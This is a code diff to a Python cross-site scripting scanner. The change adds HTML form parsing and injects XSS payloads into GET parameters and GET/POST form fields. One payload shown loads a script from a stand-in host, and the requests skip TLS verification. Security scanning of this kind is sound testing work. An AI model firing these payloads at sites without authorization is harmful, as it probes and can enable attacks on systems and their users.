@@ -3,6 +3,7 @@ import httpx
 import urllib.parse
 from typing import List, Tuple, Dict
 import re
+from html.parser import HTMLParser
 
 # Common XSS payloads to test
 XSS_PAYLOADS = [
@@ -23,13 +24,55 @@ XSS_PAYLOADS = [
     "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
 ]
 
+class FormParser(HTMLParser):
+    """Parse HTML to extract forms and their inputs"""
+    
+    def __init__(self):
+        super().__init__()
+        self.forms = []
+        self.current_form = None
+        self.current_input = None
+    
+    def handle_starttag(self, tag, attrs):
+        attrs_dict = dict(attrs)
+        
+        if tag == 'form':
+            self.current_form = {
+                'action': attrs_dict.get('action', ''),
+                'method': attrs_dict.get('method', 'get').upper(),
+                'inputs': []
+            }
+        
+        elif tag in ['input', 'textarea', 'select'] and self.current_form is not None:
+            input_data = {
+                'type': attrs_dict.get('type', 'text'),
+                'name': attrs_dict.get('name', ''),
+                'value': attrs_dict.get('value', '')
+            }
+            if input_data['name']:  # Only add inputs with names
+                self.current_form['inputs'].append(input_data)
+    
+    def handle_endtag(self, tag):
+        if tag == 'form' and self.current_form is not None:
+            self.forms.append(self.current_form)
+            self.current_form = None
+
 def log(msg, level='INFO'):
     """Simple logging function"""
     print(f'[{level}] {msg}')
 
+def extract_forms(html_content: str) -> List[Dict]:
+    """Extract all forms from HTML content"""
+    parser = FormParser()
+    try:
+        parser.feed(html_content)
+    except Exception as e:
+        log(f'Error parsing HTML forms: {str(e)}', 'DEBUG')
+    return parser.forms
+
 def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
     """
-    Test for reflected XSS vulnerabilities by injecting payloads into URL parameters.
+    Test for reflected XSS vulnerabilities by injecting payloads into URL parameters and forms.
     
     Args:
         url: Target URL to test
@@ -41,47 +84,49 @@ def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
     vulnerabilities = []
     
     try:
-        # Parse URL to extract query parameters
-        parsed = urllib.parse.urlparse(url)
-        params = urllib.parse.parse_qs(parsed.query)
-        
-        # If no parameters, try common parameter names
-        if not params:
-            common_params = ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect']
-            params = {param: ['test'] for param in common_params}
-        
-        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-        
         with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
+            # First, get the page to extract forms
+            initial_response = client.get(url)
+            forms = extract_forms(initial_response.text)
+            
+            # Parse URL to extract query parameters
+            parsed = urllib.parse.urlparse(url)
+            params = urllib.parse.parse_qs(parsed.query)
+            
+            # Test URL parameters (GET)
+            if not params:
+                # If no parameters in URL, try common parameter names
+                common_params = ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
+                params = {param: ['test'] for param in common_params}
+            
+            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            
+            # Test GET parameters
             for param_name in params.keys():
-                log(f'Testing XSS on parameter: {param_name}', 'INFO')
+                log(f'Testing XSS on GET parameter: {param_name}', 'INFO')
                 
                 for payload in XSS_PAYLOADS:
-                    # Create test parameters with payload
                     test_params = params.copy()
                     test_params[param_name] = [payload]
-                    
-                    # Flatten params for request
                     flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                     
                     try:
                         response = client.get(base_url, params=flat_params)
                         
-                        # Check if payload is reflected in response
                         if payload in response.text:
-                            # Additional check: see if it's not properly escaped
                             if is_xss_vulnerable(response.text, payload):
                                 vuln = {
                                     'type': 'reflected_xss',
+                                    'method': 'GET',
                                     'parameter': param_name,
                                     'payload': payload,
                                     'url': str(response.url),
                                     'severity': 'high',
-                                    'description': f'Reflected XSS found in parameter "{param_name}"'
+                                    'description': f'Reflected XSS found in GET parameter "{param_name}"'
                                 }
                                 vulnerabilities.append(vuln)
-                                log(f'XSS FOUND: {param_name} with payload: {payload[:50]}...', 'VULN')
-                                break  # Found vulnerability for this param, move to next
+                                log(f'XSS FOUND: GET parameter {param_name} with payload: {payload[:50]}...', 'VULN')
+                                break
                     
                     except httpx.TimeoutException:
                         log(f'Timeout testing {param_name}', 'WARN')
@@ -89,6 +134,68 @@ def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
                     except Exception as e:
                         log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
                         continue
+            
+            # Test forms (POST/GET based on form method)
+            if forms:
+                log(f'Found {len(forms)} form(s) to test', 'INFO')
+                
+                for form_idx, form in enumerate(forms):
+                    if not form['inputs']:
+                        continue
+                    
+                    form_action = form['action']
+                    # Resolve relative form action URLs
+                    if form_action:
+                        form_url = urllib.parse.urljoin(url, form_action)
+                    else:
+                        form_url = url
+                    
+                    log(f'Testing form {form_idx + 1} ({form["method"]}) with {len(form["inputs"])} input(s)', 'INFO')
+                    
+                    # Test each input field in the form
+                    for input_field in form['inputs']:
+                        if input_field['type'] in ['submit', 'button', 'image']:
+                            continue  # Skip non-data inputs
+                        
+                        field_name = input_field['name']
+                        log(f'Testing form input: {field_name}', 'INFO')
+                        
+                        for payload in XSS_PAYLOADS:
+                            # Build form data with payload in the tested field
+                            form_data = {}
+                            for inp in form['inputs']:
+                                if inp['name'] == field_name:
+                                    form_data[inp['name']] = payload
+                                else:
+                                    form_data[inp['name']] = inp['value'] or 'test'
+                            
+                            try:
+                                if form['method'] == 'POST':
+                                    response = client.post(form_url, data=form_data)
+                                else:
+                                    response = client.get(form_url, params=form_data)
+                                
+                                if payload in response.text:
+                                    if is_xss_vulnerable(response.text, payload):
+                                        vuln = {
+                                            'type': 'reflected_xss',
+                                            'method': form['method'],
+                                            'parameter': field_name,
+                                            'payload': payload,
+                                            'url': form_url,
+                                            'severity': 'high',
+                                            'description': f'Reflected XSS found in {form["method"]} form input "{field_name}"'
+                                        }
+                                        vulnerabilities.append(vuln)
+                                        log(f'XSS FOUND: {form["method"]} form input {field_name} with payload: {payload[:50]}...', 'VULN')
+                                        break
+                            
+                            except httpx.TimeoutException:
+                                log(f'Timeout testing form input {field_name}', 'WARN')
+                                break
+                            except Exception as e:
+                                log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
+                                continue
     
     except Exception as e:
         log(f'XSS scanner error: {str(e)}', 'ERROR')
@@ -233,7 +340,7 @@ def check_xss(url: str, timeout: int = 10) -> List[Dict]:
     
     all_vulnerabilities = []
     
-    # Test for reflected XSS
+    # Test for reflected XSS (GET params and forms)
     reflected_vulns = test_reflected_xss(url, timeout)
     all_vulnerabilities.extend(reflected_vulns)
     
